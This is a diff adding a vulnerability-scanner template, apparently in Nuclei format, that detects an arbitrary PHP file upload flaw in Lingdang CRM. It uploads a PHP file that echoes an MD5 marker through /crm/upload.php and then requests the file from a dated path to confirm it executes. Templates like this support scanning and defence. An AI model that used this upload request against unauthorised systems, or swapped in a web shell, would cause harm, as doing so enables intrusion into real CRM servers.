@@ -1,0 +1,46 @@
+id: poc-yaml-51mis-crm-upload-anyfile-upload
+info:
+  name: Lingdang CRM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/crm/upload.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----234561"
+    body: |-
+      ------234561
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});?>
+      ------234561--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "import url"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/crm/recordData/{{dt1}}{{dt2}}{{dt3}}/{{t1}}.php"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
